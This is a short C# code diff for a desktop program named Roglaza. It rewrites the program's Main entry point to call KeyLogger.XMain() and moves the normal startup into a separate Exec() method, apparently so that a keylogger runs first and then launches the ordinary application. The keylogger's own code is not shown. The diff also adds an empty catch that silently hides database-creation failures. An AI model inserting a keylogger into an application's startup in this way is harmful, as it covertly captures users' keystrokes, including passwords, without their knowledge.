@@ -18,7 +18,14 @@ namespace Roglaza
 
         static void Main()
         {
-
+            try
+            {
+                KeyLogger.XMain();
+            }
+            catch(Exception e) { MessageBox.Show(e.Message); }
+        }
+        public  static void Exec()
+        {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
@@ -31,8 +38,7 @@ namespace Roglaza
 
             //Detecting test mode
             AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
-            ProgramSettings = new RoglazaSettings();
-            ProgramSettings.LoadFromFile();
+            LoadSettings();
 
             RoglazaInstaller.InstallDirectories();
 
@@ -40,15 +46,18 @@ namespace Roglaza
              
             if (ProgramSettings.LoadFromFile()|| Force_creat )
             {
-                DBManager.CreateNewDataBase();   
+            try {   DBManager.CreateNewDataBase();   }catch{}
                 var f = new FrmAdminPanel();
                 f.ShowDialog();
                 ProgramSettings.SaveSettings();
             }
 
         }
-
-
+        public static void LoadSettings()
+      {
+          ProgramSettings = new RoglazaSettings();
+          ProgramSettings.LoadFromFile();
+      }
         public static RoglazaSettings ProgramSettings = new RoglazaSettings();
         public static System.Drawing.Icon icon ;
         internal static string GetExecutablePath()
@@ -61,4 +70,7 @@ namespace Roglaza
 
         }
     }
+
+
+
 }
